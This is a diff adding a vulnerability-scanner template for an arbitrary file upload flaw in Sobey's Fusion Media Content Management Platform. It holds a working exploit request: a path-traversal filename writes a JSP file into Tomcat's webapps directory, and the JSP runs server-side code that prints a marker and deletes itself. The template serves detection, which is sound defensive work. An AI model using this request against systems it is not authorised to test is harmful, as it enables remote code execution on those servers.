@@ -1,0 +1,58 @@
+id: poc-yaml-sobey-imcmp-upload-anyfile-upload
+
+info:
+  name: Sobey IMCMP Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Sobey Fusion Media Content Management Platform allows arbitrary file upload via the watermark upload endpoint, potentially leading to remote code execution.
+
+variables:
+  t1: "{{rand_text_alphanumeric(9)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/sobey-mchEditor/watermark/upload"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/{{t1}}.jsp"
+      Content-Type: image/jpeg
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"status":200'
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/sobey-mchEditor/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
